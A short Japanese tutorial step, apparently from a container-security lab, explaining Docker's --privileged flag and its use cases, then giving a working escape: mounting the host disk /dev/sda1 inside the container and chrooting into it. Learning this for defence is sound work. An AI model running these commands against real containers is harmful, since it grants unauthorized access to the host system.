# step1

`--privileged`フラグを利用したコンテナ脱出

Seccomp、AppArmor、SELinuxなどのセキュリティ機能を無効化するフラグ。

## `--privileged` のユースケース

- Docker in Docker(DinD)
- ハードウェアデバイスへのアクセス
- ホストのカーネルパラメーターの変更

## 脱出

コンテナないで実行する

```sh
# install fdisk
apt-get update && apt-get install -y fdisk
# fdiskでホストのディスクを確認
fdisk -l
# or
lsblk
# マウントポイントをコンテナ内に作成
mkdir /host_fs
# ホストのルートファイルシステムをコンテナ内にマウント
mount /dev/sda1 /host_fs
# ホストのルートファイルシステムにchrootする
chroot /host_fs
```
